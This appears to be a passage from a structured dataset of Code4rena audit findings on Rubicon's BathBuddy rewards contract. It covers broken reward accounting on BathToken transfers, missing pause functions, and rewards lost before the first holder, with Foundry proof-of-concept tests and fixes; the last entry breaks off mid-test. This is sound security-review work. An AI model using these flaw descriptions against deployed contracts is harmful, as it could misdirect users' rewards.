      "mitigation": "## Recommendation\n\nThere are two recommended paths here. The easy path would be to just add the `stake` and `withdraw` functions to the BathBuddy contract similar to how the original StakingRewards contract works on Synthetix. However, this may change the original intention of the protocol as rewards won't be earned just by holding BathTokens, they will need to be staked (rewards will only be distributed to stakers).\n\nThe other path, and a bit more complex, would be to modify the BathToken contract (the cToken) so that burn, mint and transfer actions trigger the update on the paired BathBuddy contract.\n",
      "poc": "## Proof of Concept\n\nIn the following test we demonstrate one of the possible scenarios where reward accounting is broken, this is a simple case in which rewards fail to be updated when a token transfer is executed. Alice has 1e18 BathTokens, at the middle of the rewards duration period she sends all her tokens to Bob. The expected outcome should be that Alice would earn half of the rewards, as she held the tokens for the half of the duration period. But when the duration period has ended, we call `getReward` for both Alice and Bob and we can see that Alice got nothing and Bob earned 100% of the rewards.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_BathBuddy_IncorrectRewardAccounting() public {\n    // Setup rewards\n    uint256 startTime = block.timestamp;\n    uint256 duration = 10_000 seconds;\n    vm.prank(bathBuddyOwner);\n    bathBuddy.setRewardsDuration(duration, address(rewardToken));\n\n    uint256 rewardAmount = 100 ether;\n    rewardToken.mint(address(bathBuddy), rewardAmount);\n    vm.prank(bathBuddyOwner);\n    bathBuddy.notifyRewardAmount(rewardAmount, rewardToken);\n\n    // Mint bathTokens to Alice\n    uint256 bathTokenAmount = 1 ether;\n    bathToken.mint(alice, bathTokenAmount);\n\n    // Simulate half of the duration time passes\n    vm.warp(startTime + duration / 2);\n\n    // Alice transfers tokens for Bob at middle of the period\n    vm.prank(alice);\n    bathToken.transfer(bob, bathTokenAmount);\n\n    // Simulate complete duration time passes\n    vm.warp(startTime + duration);\n\n    // Trigger getRewards for Alice\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, alice);\n\n    // Trigger getRewards for Bob\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, bob);\n\n    // Alice gets nothings and Bob gets the full rewards, even though Alice held the tokens for half the duration time\n    assertEq(rewardToken.balanceOf(alice), 0);\n    assertEq(rewardToken.balanceOf(bob), rewardAmount);\n}\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L38\n\n**container:**\n# Vulnerability details\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nThe `BathBuddy` contracts implements rewards for liquidity providers (holders of `BathToken`). The contract is modeled after the famous Synthetix staking contract, with some tweaks to support rewards for multiple tokens at the same time.\n\nThe implementation overall is correct, however there is a critical difference with the Synthetix contract that is ignored in the `BathBuddy` contract. In the Synthetix implementation the main actions related to rewards accounting are the `stake` and `withdraw` actions, these trigger the `updateReward` modifier to ensure correct reward accounting. Staked tokens cannot be transferred, as these are held in the staking contract. In the BathBuddy implementation things are very different as there is no staking, rewards are intended to be distributed directly to holders of the BathToken without any need of staking the tokens in the contract. This means that, as there is no \"staking\" action in the BathBuddy implementation (i.e. depositing funds in the contract), rewards fail to be correctly accounted whenever BathToken are minted, burned or transferred between different accounts.\n\nThese are two critical places in the code where the BathBuddy contract uses the state from the BathToken, but fails to be triggered whenever the state in the BathToken is modified. The first is the `rewardPerToken` that calculates the amount of rewards that should correspond to one unit of the BathToken token, this is logically dependent on the total supply of the token (lines 124 and 133):\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L121-L135\n\n```solidity\n121:     function rewardPerToken(address token) public view returns (uint256) {\n122:         require(friendshipStarted, \"I have not started a bathToken friendship\");\n123:\n124:         if (IERC20(myBathTokenBuddy).totalSupply() == 0) {\n125:             return rewardsPerTokensStored[token];\n126:         }\n127:         return\n128:             rewardsPerTokensStored[token].add(\n129:                 lastTimeRewardApplicable(token)\n130:                     .sub(lastUpdateTime[token])\n131:                     .mul(rewardRates[token])\n132:                     .mul(1e18)\n133:                     .div(IERC20(myBathTokenBuddy).totalSupply())\n134:             );\n135:     }\n```\n\nThe other place is in the `earned` function which uses the BathToken `balanceOf` function of an account (lines 146-147):\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L139-L161\n\n```solidity\n139:     function earned(\n140:         address account,\n141:         address token\n142:     ) public view override returns (uint256) {\n143:         require(friendshipStarted, \"I have not started a bathToken friendship\");\n144:\n145:         return\n146:             IERC20(myBathTokenBuddy) // Care with this?\n147:                 .balanceOf(account)\n148:                 .mul(\n149:                     rewardPerToken(token).sub(\n150:                         userRewardsPerTokenPaid[token][account]\n151:                     )\n152:                 )\n153:                 .div(1e18)\n154:                 .add(tokenRewards[token][account]);\n155:     }\n156:\n157:     function getRewardForDuration(\n158:         address token\n159:     ) external view returns (uint256) {\n160:         return rewardRates[token].mul(rewardsDuration[token]);\n161:     }\n```\n\nSince the whole BathBuddy contract is dependent on the total supply and account balance state of the paired BathToken contract, the following actions in the token should update the rewards state in BathBuddy:\n\n- `mint` and `burn`, as these modify the total supply of the token and the balances of the account whose tokens are minted or burned.\n- `transfer` and `transferFrom`, as these modify the balances of the sender and recipient accounts.\n\nAs the BathBuddy `updateReward` modifier fails to be triggered when the mentioned state in the BathToken is modified, reward accounting will be incorrect for many different scenarios. We'll explore one of these in the next section.\n",
        "recommendation": "## Recommendation\n\nThere are two recommended paths here. The easy path would be to just add the `stake` and `withdraw` functions to the BathBuddy contract similar to how the original StakingRewards contract works on Synthetix. However, this may change the original intention of the protocol as rewards won't be earned just by holding BathTokens, they will need to be staked (rewards will only be distributed to stakers).\n\nThe other path, and a bit more complex, would be to modify the BathToken contract (the cToken) so that burn, mint and transfer actions trigger the update on the paired BathBuddy contract.\n",
        "poc": "## Proof of Concept\n\nIn the following test we demonstrate one of the possible scenarios where reward accounting is broken, this is a simple case in which rewards fail to be updated when a token transfer is executed. Alice has 1e18 BathTokens, at the middle of the rewards duration period she sends all her tokens to Bob. The expected outcome should be that Alice would earn half of the rewards, as she held the tokens for the half of the duration period. But when the duration period has ended, we call `getReward` for both Alice and Bob and we can see that Alice got nothing and Bob earned 100% of the rewards.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_BathBuddy_IncorrectRewardAccounting() public {\n    // Setup rewards\n    uint256 startTime = block.timestamp;\n    uint256 duration = 10_000 seconds;\n    vm.prank(bathBuddyOwner);\n    bathBuddy.setRewardsDuration(duration, address(rewardToken));\n\n    uint256 rewardAmount = 100 ether;\n    rewardToken.mint(address(bathBuddy), rewardAmount);\n    vm.prank(bathBuddyOwner);\n    bathBuddy.notifyRewardAmount(rewardAmount, rewardToken);\n\n    // Mint bathTokens to Alice\n    uint256 bathTokenAmount = 1 ether;\n    bathToken.mint(alice, bathTokenAmount);\n\n    // Simulate half of the duration time passes\n    vm.warp(startTime + duration / 2);\n\n    // Alice transfers tokens for Bob at middle of the period\n    vm.prank(alice);\n    bathToken.transfer(bob, bathTokenAmount);\n\n    // Simulate complete duration time passes\n    vm.warp(startTime + duration);\n\n    // Trigger getRewards for Alice\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, alice);\n\n    // Trigger getRewards for Bob\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, bob);\n\n    // Alice gets nothings and Bob gets the full rewards, even though Alice held the tokens for half the duration time\n    assertEq(rewardToken.balanceOf(alice), 0);\n    assertEq(rewardToken.balanceOf(bob), rewardAmount);\n}\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L38\n\n**container:**\n# Vulnerability details\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L38\n\n\n# Vulnerability details\n\n## Impact\n\nThe `BathBuddy` contracts implements rewards for liquidity providers (holders of `BathToken`). The contract is modeled after the famous Synthetix staking contract, with some tweaks to support rewards for multiple tokens at the same time.\n\nThe implementation overall is correct, however there is a critical difference with the Synthetix contract that is ignored in the `BathBuddy` contract. In the Synthetix implementation the main actions related to rewards accounting are the `stake` and `withdraw` actions, these trigger the `updateReward` modifier to ensure correct reward accounting. Staked tokens cannot be transferred, as these are held in the staking contract. In the BathBuddy implementation things are very different as there is no staking, rewards are intended to be distributed directly to holders of the BathToken without any need of staking the tokens in the contract. This means that, as there is no \"staking\" action in the BathBuddy implementation (i.e. depositing funds in the contract), rewards fail to be correctly accounted whenever BathToken are minted, burned or transferred between different accounts.\n\nThese are two critical places in the code where the BathBuddy contract uses the state from the BathToken, but fails to be triggered whenever the state in the BathToken is modified. The first is the `rewardPerToken` that calculates the amount of rewards that should correspond to one unit of the BathToken token, this is logically dependent on the total supply of the token (lines 124 and 133):\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L121-L135\n\n```solidity\n121:     function rewardPerToken(address token) public view returns (uint256) {\n122:         require(friendshipStarted, \"I have not started a bathToken friendship\");\n123:\n124:         if (IERC20(myBathTokenBuddy).totalSupply() == 0) {\n125:             return rewardsPerTokensStored[token];\n126:         }\n127:         return\n128:             rewardsPerTokensStored[token].add(\n129:                 lastTimeRewardApplicable(token)\n130:                     .sub(lastUpdateTime[token])\n131:                     .mul(rewardRates[token])\n132:                     .mul(1e18)\n133:                     .div(IERC20(myBathTokenBuddy).totalSupply())\n134:             );\n135:     }\n```\n\nThe other place is in the `earned` function which uses the BathToken `balanceOf` function of an account (lines 146-147):\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L139-L161\n\n```solidity\n139:     function earned(\n140:         address account,\n141:         address token\n142:     ) public view override returns (uint256) {\n143:         require(friendshipStarted, \"I have not started a bathToken friendship\");\n144:\n145:         return\n146:             IERC20(myBathTokenBuddy) // Care with this?\n147:                 .balanceOf(account)\n148:                 .mul(\n149:                     rewardPerToken(token).sub(\n150:                         userRewardsPerTokenPaid[token][account]\n151:                     )\n152:                 )\n153:                 .div(1e18)\n154:                 .add(tokenRewards[token][account]);\n155:     }\n156:\n157:     function getRewardForDuration(\n158:         address token\n159:     ) external view returns (uint256) {\n160:         return rewardRates[token].mul(rewardsDuration[token]);\n161:     }\n```\n\nSince the whole BathBuddy contract is dependent on the total supply and account balance state of the paired BathToken contract, the following actions in the token should update the rewards state in BathBuddy:\n\n- `mint` and `burn`, as these modify the total supply of the token and the balances of the account whose tokens are minted or burned.\n- `transfer` and `transferFrom`, as these modify the balances of the sender and recipient accounts.\n\nAs the BathBuddy `updateReward` modifier fails to be triggered when the mentioned state in the BathToken is modified, reward accounting will be incorrect for many different scenarios. We'll explore one of these in the next section.\n\n## Proof of Concept\n\nIn the following test we demonstrate one of the possible scenarios where reward accounting is broken, this is a simple case in which rewards fail to be updated when a token transfer is executed. Alice has 1e18 BathTokens, at the middle of the rewards duration period she sends all her tokens to Bob. The expected outcome should be that Alice would earn half of the rewards, as she held the tokens for the half of the duration period. But when the duration period has ended, we call `getReward` for both Alice and Bob and we can see that Alice got nothing and Bob earned 100% of the rewards.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_BathBuddy_IncorrectRewardAccounting() public {\n    // Setup rewards\n    uint256 startTime = block.timestamp;\n    uint256 duration = 10_000 seconds;\n    vm.prank(bathBuddyOwner);\n    bathBuddy.setRewardsDuration(duration, address(rewardToken));\n\n    uint256 rewardAmount = 100 ether;\n    rewardToken.mint(address(bathBuddy), rewardAmount);\n    vm.prank(bathBuddyOwner);\n    bathBuddy.notifyRewardAmount(rewardAmount, rewardToken);\n\n    // Mint bathTokens to Alice\n    uint256 bathTokenAmount = 1 ether;\n    bathToken.mint(alice, bathTokenAmount);\n\n    // Simulate half of the duration time passes\n    vm.warp(startTime + duration / 2);\n\n    // Alice transfers tokens for Bob at middle of the period\n    vm.prank(alice);\n    bathToken.transfer(bob, bathTokenAmount);\n\n    // Simulate complete duration time passes\n    vm.warp(startTime + duration);\n\n    // Trigger getRewards for Alice\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, alice);\n\n    // Trigger getRewards for Bob\n    vm.prank(bathBuddyHouse);\n    bathBuddy.getReward(rewardToken, bob);\n\n    // Alice gets nothings and Bob gets the full rewards, even though Alice held the tokens for half the duration time\n    assertEq(rewardToken.balanceOf(alice), 0);\n    assertEq(rewardToken.balanceOf(bob), rewardAmount);\n}\n```\n\n## Recommendation\n\nThere are two recommended paths here. The easy path would be to just add the `stake` and `withdraw` functions to the BathBuddy contract similar to how the original StakingRewards contract works on Synthetix. However, this may change the original intention of the protocol as rewards won't be earned just by holding BathTokens, they will need to be staked (rewards will only be distributed to stakers).\n\nThe other path, and a bit more complex, would be to modify the BathToken contract (the cToken) so that burn, mint and transfer actions trigger the update on the paired BathBuddy contract.\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 1286,
      "page_start": null,
      "heading": "1286. BathBuddy contract should implement methods to pause and unpause contract",
      "heading_cleaned": "BathBuddy contract should implement methods to pause and unpause contract",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L38\n\n\n# Vulnerability details\n\n## Impact\n\nThe BathBuddy contract inherits from OpenZeppelin `Pausable` contract with the intention of adding pausing features to the contract.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L38\n\n```solidity\n38: contract BathBuddy is ReentrancyGuard, IBathBuddy, Pausable {\n```\n\nThe [`Pausable` implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol) contains all the logic to implement pausing, but doesn't include any external or public functionality to actually trigger the pause or resume, this task is left to the derived contract.\n\nThe BathBuddy contract fails to implement these functions, as there is no callable function from the outside that modifies the pause state. The pausing mechanism is intended to be used in the `getReward` function, as this function includes the `whenNotPaused`:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L168-L185\n\n```solidity\n168:     function getReward(\n169:         IERC20 rewardsToken,\n170:         address holderRecipient\n171:     )\n172:         external\n173:         override\n174:         nonReentrant\n175:         whenNotPaused\n176:         updateReward(holderRecipient, address(rewardsToken))\n177:         onlyBathHouse\n178:     {\n179:         uint256 reward = tokenRewards[address(rewardsToken)][holderRecipient];\n180:         if (reward > 0) {\n181:             tokenRewards[address(rewardsToken)][holderRecipient] = 0;\n182:             rewardsToken.safeTransfer(holderRecipient, reward);\n183:             emit RewardPaid(holderRecipient, reward);\n184:         }\n185:     }\n```\n\nThis means that protocol admin won't be able to pause this function if needed as there is no accessible function to enable the mechanism at all.\n\n## Proof of Concept\n\nThe BathBuddy contract code doesn't include any external or public function to pause or resume the contract. The OpenZeppelin implementations only contains internal functions to provide support so that the derived contract implements the public interface:\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol#L82-L104\n\n```solidity\n/**\n  * @dev Triggers stopped state.\n  *\n  * Requirements:\n  *\n  * - The contract must not be paused.\n  */\nfunction _pause() internal virtual whenNotPaused {\n    _paused = true;\n    emit Paused(_msgSender());\n}\n\n/**\n  * @dev Returns to normal state.\n  *\n  * Requirements:\n  *\n  * - The contract must be paused.\n  */\nfunction _unpause() internal virtual whenPaused {\n    _paused = false;\n    emit Unpaused(_msgSender());\n}\n```\n\n## Recommendation\n\nThe BathBuddy contract should implement the functions to expose the pausing mechanism. These functions should only be accessible to the owner of the contract.\n\n```solidity\nfunction pause() external onlyOwner {\n    _pause();\n}\n\nfunction unpause() external onlyOwner {\n    _unpause();\n}\n```\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L38\n\n\n# Vulnerability details\n\n## Impact\n\nThe BathBuddy contract inherits from OpenZeppelin `Pausable` contract with the intention of adding pausing features to the contract. \n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L38\n\n```solidity\n38: contract BathBuddy is ReentrancyGuard, IBathBuddy, Pausable {\n```\n\nThe [`Pausable` implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol) contains all the logic to implement pausing, but doesn't include any external or public functionality to actually trigger the pause or resume, this task is left to the derived contract.\n\nThe BathBuddy contract fails to implement these functions, as there is no callable function from the outside that modifies the pause state. The pausing mechanism is intended to be used in the `getReward` function, as this function includes the `whenNotPaused`:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L168-L185\n\n```solidity\n168:     function getReward(\n169:         IERC20 rewardsToken,\n170:         address holderRecipient\n171:     )\n172:         external\n173:         override\n174:         nonReentrant\n175:         whenNotPaused\n176:         updateReward(holderRecipient, address(rewardsToken))\n177:         onlyBathHouse\n178:     {\n179:         uint256 reward = tokenRewards[address(rewardsToken)][holderRecipient];\n180:         if (reward > 0) {\n181:             tokenRewards[address(rewardsToken)][holderRecipient] = 0;\n182:             rewardsToken.safeTransfer(holderRecipient, reward);\n183:             emit RewardPaid(holderRecipient, reward);\n184:         }\n185:     }\n```\n\nThis means that protocol admin won't be able to pause this function if needed as there is no accessible function to enable the mechanism at all.\n\n## Proof of Concept\n\nThe BathBuddy contract code doesn't include any external or public function to pause or resume the contract. The OpenZeppelin implementations only contains internal functions to provide support so that the derived contract implements the public interface:\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol#L82-L104\n\n```solidity\n/**\n  * @dev Triggers stopped state.\n  *\n  * Requirements:\n  *\n  * - The contract must not be paused.\n  */\nfunction _pause() internal virtual whenNotPaused {\n    _paused = true;\n    emit Paused(_msgSender());\n}\n\n/**\n  * @dev Returns to normal state.\n  *\n  * Requirements:\n  *\n  * - The contract must be paused.\n  */\nfunction _unpause() internal virtual whenPaused {\n    _paused = false;\n    emit Unpaused(_msgSender());\n}\n```\n\n## Recommendation\n\nThe BathBuddy contract should implement the functions to expose the pausing mechanism. These functions should only be accessible to the owner of the contract.\n\n```solidity\nfunction pause() external onlyOwner {\n    _pause();\n}\n\nfunction unpause() external onlyOwner {\n    _unpause();\n}\n```\n",
      "description": null,
      "impact": "## Impact\n\nThe BathBuddy contract inherits from OpenZeppelin `Pausable` contract with the intention of adding pausing features to the contract.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L38\n\n```solidity\n38: contract BathBuddy is ReentrancyGuard, IBathBuddy, Pausable {\n```\n\nThe [`Pausable` implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol) contains all the logic to implement pausing, but doesn't include any external or public functionality to actually trigger the pause or resume, this task is left to the derived contract.\n\nThe BathBuddy contract fails to implement these functions, as there is no callable function from the outside that modifies the pause state. The pausing mechanism is intended to be used in the `getReward` function, as this function includes the `whenNotPaused`:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L168-L185\n\n```solidity\n168:     function getReward(\n169:         IERC20 rewardsToken,\n170:         address holderRecipient\n171:     )\n172:         external\n173:         override\n174:         nonReentrant\n175:         whenNotPaused\n176:         updateReward(holderRecipient, address(rewardsToken))\n177:         onlyBathHouse\n178:     {\n179:         uint256 reward = tokenRewards[address(rewardsToken)][holderRecipient];\n180:         if (reward > 0) {\n181:             tokenRewards[address(rewardsToken)][holderRecipient] = 0;\n182:             rewardsToken.safeTransfer(holderRecipient, reward);\n183:             emit RewardPaid(holderRecipient, reward);\n184:         }\n185:     }\n```\n\nThis means that protocol admin won't be able to pause this function if needed as there is no accessible function to enable the mechanism at all.\n",
      "mitigation": "## Recommendation\n\nThe BathBuddy contract should implement the functions to expose the pausing mechanism. These functions should only be accessible to the owner of the contract.\n\n```solidity\nfunction pause() external onlyOwner {\n    _pause();\n}\n\nfunction unpause() external onlyOwner {\n    _unpause();\n}\n```\n",
      "poc": "## Proof of Concept\n\nThe BathBuddy contract code doesn't include any external or public function to pause or resume the contract. The OpenZeppelin implementations only contains internal functions to provide support so that the derived contract implements the public interface:\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol#L82-L104\n\n```solidity\n/**\n  * @dev Triggers stopped state.\n  *\n  * Requirements:\n  *\n  * - The contract must not be paused.\n  */\nfunction _pause() internal virtual whenNotPaused {\n    _paused = true;\n    emit Paused(_msgSender());\n}\n\n/**\n  * @dev Returns to normal state.\n  *\n  * Requirements:\n  *\n  * - The contract must be paused.\n  */\nfunction _unpause() internal virtual whenPaused {\n    _paused = false;\n    emit Unpaused(_msgSender());\n}\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L38\n\n**container:**\n# Vulnerability details\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nThe BathBuddy contract inherits from OpenZeppelin `Pausable` contract with the intention of adding pausing features to the contract.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L38\n\n```solidity\n38: contract BathBuddy is ReentrancyGuard, IBathBuddy, Pausable {\n```\n\nThe [`Pausable` implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol) contains all the logic to implement pausing, but doesn't include any external or public functionality to actually trigger the pause or resume, this task is left to the derived contract.\n\nThe BathBuddy contract fails to implement these functions, as there is no callable function from the outside that modifies the pause state. The pausing mechanism is intended to be used in the `getReward` function, as this function includes the `whenNotPaused`:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L168-L185\n\n```solidity\n168:     function getReward(\n169:         IERC20 rewardsToken,\n170:         address holderRecipient\n171:     )\n172:         external\n173:         override\n174:         nonReentrant\n175:         whenNotPaused\n176:         updateReward(holderRecipient, address(rewardsToken))\n177:         onlyBathHouse\n178:     {\n179:         uint256 reward = tokenRewards[address(rewardsToken)][holderRecipient];\n180:         if (reward > 0) {\n181:             tokenRewards[address(rewardsToken)][holderRecipient] = 0;\n182:             rewardsToken.safeTransfer(holderRecipient, reward);\n183:             emit RewardPaid(holderRecipient, reward);\n184:         }\n185:     }\n```\n\nThis means that protocol admin won't be able to pause this function if needed as there is no accessible function to enable the mechanism at all.\n",
        "recommendation": "## Recommendation\n\nThe BathBuddy contract should implement the functions to expose the pausing mechanism. These functions should only be accessible to the owner of the contract.\n\n```solidity\nfunction pause() external onlyOwner {\n    _pause();\n}\n\nfunction unpause() external onlyOwner {\n    _unpause();\n}\n```\n",
        "poc": "## Proof of Concept\n\nThe BathBuddy contract code doesn't include any external or public function to pause or resume the contract. The OpenZeppelin implementations only contains internal functions to provide support so that the derived contract implements the public interface:\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol#L82-L104\n\n```solidity\n/**\n  * @dev Triggers stopped state.\n  *\n  * Requirements:\n  *\n  * - The contract must not be paused.\n  */\nfunction _pause() internal virtual whenNotPaused {\n    _paused = true;\n    emit Paused(_msgSender());\n}\n\n/**\n  * @dev Returns to normal state.\n  *\n  * Requirements:\n  *\n  * - The contract must be paused.\n  */\nfunction _unpause() internal virtual whenPaused {\n    _paused = false;\n    emit Unpaused(_msgSender());\n}\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L38\n\n**container:**\n# Vulnerability details\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L38\n\n\n# Vulnerability details\n\n## Impact\n\nThe BathBuddy contract inherits from OpenZeppelin `Pausable` contract with the intention of adding pausing features to the contract.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L38\n\n```solidity\n38: contract BathBuddy is ReentrancyGuard, IBathBuddy, Pausable {\n```\n\nThe [`Pausable` implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol) contains all the logic to implement pausing, but doesn't include any external or public functionality to actually trigger the pause or resume, this task is left to the derived contract.\n\nThe BathBuddy contract fails to implement these functions, as there is no callable function from the outside that modifies the pause state. The pausing mechanism is intended to be used in the `getReward` function, as this function includes the `whenNotPaused`:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L168-L185\n\n```solidity\n168:     function getReward(\n169:         IERC20 rewardsToken,\n170:         address holderRecipient\n171:     )\n172:         external\n173:         override\n174:         nonReentrant\n175:         whenNotPaused\n176:         updateReward(holderRecipient, address(rewardsToken))\n177:         onlyBathHouse\n178:     {\n179:         uint256 reward = tokenRewards[address(rewardsToken)][holderRecipient];\n180:         if (reward > 0) {\n181:             tokenRewards[address(rewardsToken)][holderRecipient] = 0;\n182:             rewardsToken.safeTransfer(holderRecipient, reward);\n183:             emit RewardPaid(holderRecipient, reward);\n184:         }\n185:     }\n```\n\nThis means that protocol admin won't be able to pause this function if needed as there is no accessible function to enable the mechanism at all.\n\n## Proof of Concept\n\nThe BathBuddy contract code doesn't include any external or public function to pause or resume the contract. The OpenZeppelin implementations only contains internal functions to provide support so that the derived contract implements the public interface:\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol#L82-L104\n\n```solidity\n/**\n  * @dev Triggers stopped state.\n  *\n  * Requirements:\n  *\n  * - The contract must not be paused.\n  */\nfunction _pause() internal virtual whenNotPaused {\n    _paused = true;\n    emit Paused(_msgSender());\n}\n\n/**\n  * @dev Returns to normal state.\n  *\n  * Requirements:\n  *\n  * - The contract must be paused.\n  */\nfunction _unpause() internal virtual whenPaused {\n    _paused = false;\n    emit Unpaused(_msgSender());\n}\n```\n\n## Recommendation\n\nThe BathBuddy contract should implement the functions to expose the pausing mechanism. These functions should only be accessible to the owner of the contract.\n\n```solidity\nfunction pause() external onlyOwner {\n    _pause();\n}\n\nfunction unpause() external onlyOwner {\n    _unpause();\n}\n```\n",
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 1295,
      "page_start": null,
      "heading": "1295. Rewards for initial period may be lost in `BathBuddy` contract",
      "heading_cleaned": "Rewards for initial period may be lost in `BathBuddy` contract",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L191-L228\n\n\n# Vulnerability details\n\n## Impact\n\nRewards in the BathBuddy contract are initiated when the owner calls the `notifyRewardAmount`. This function calculates the reward rate per second (lines 196-198 and 207-208) and also records the start of the reward period (line 223):\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L191-L228\n\n```solidity\n191:     function notifyRewardAmount(\n192:         uint256 reward,\n193:         IERC20 rewardsToken\n194:     ) external onlyOwner updateReward(address(0), address(rewardsToken)) {\n195:         if (block.timestamp >= periodFinish[address(rewardsToken)]) {\n196:             rewardRates[address(rewardsToken)] = reward.div(\n197:                 rewardsDuration[address(rewardsToken)]\n198:             );\n199:         } else {\n200:             uint256 remaining = periodFinish[address(rewardsToken)].sub(\n201:                 block.timestamp\n202:             );\n203:             uint256 leftover = remaining.mul(\n204:                 rewardRates[address(rewardsToken)]\n205:             );\n206:             rewardRates[address(rewardsToken)] = reward.add(leftover).div(\n207:                 rewardsDuration[address(rewardsToken)]\n208:             );\n209:         }\n210:\n211:         // Ensure the provided reward amount is not more than the balance in the contract.\n212:         // This keeps the reward rate in the right range, preventing overflows due to\n213:         // very high values of rewardRate in the earned and rewardsPerToken functions;\n214:         // Reward + leftover must be less than 2^256 / 10^18 to avoid overflow.\n215:         // Note********** ERC20s must be here*************\n216:         uint256 balance = rewardsToken.balanceOf(address(this));\n217:         require(\n218:             rewardRates[address(rewardsToken)] <=\n219:                 balance.div(rewardsDuration[address(rewardsToken)]),\n220:             \"Provided reward too high\"\n221:         );\n222:\n223:         lastUpdateTime[address(rewardsToken)] = block.timestamp;\n224:         periodFinish[address(rewardsToken)] = block.timestamp.add(\n225:             rewardsDuration[address(rewardsToken)]\n226:         );\n227:         emit RewardAdded(reward);\n228:     }\n```\n\nThe intention here is to calculate how many tokens should be rewarded by unit of time (second) and record the span of time for the reward cycle. However, this has an edge case where rewards are not counted for the initial period of time until there is at least one participant (in this case, a holder of BathTokens). During this initial period of time, the reward rate will still apply but as there isn't any participant, then no one will be able to claim these rewards. See PoC for a detailed example of the issue.\n\n## Proof of Concept\n\nIn the following test, we initiate the reward process by calling `notifyRewardAmount`. At the middle of the duration process, we mint BathTokens to Alice to represent her participant. At the end of the duration process, after Alice claims her rewards, half of them will still be held in the `BathBuddy` contract.\n\nNote: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/f3b7d6f9ab043340de7deb67a9c515e5).\n\n```solidity\nfunction test_BathBuddy_RewardsLostForInitialPeriod() public {\n    // Setup rewards\n    uint256 startTime = block.timestamp;\n    uint256 duration = 10_000 seconds;\n    vm.prank(bathBuddyOwner);\n    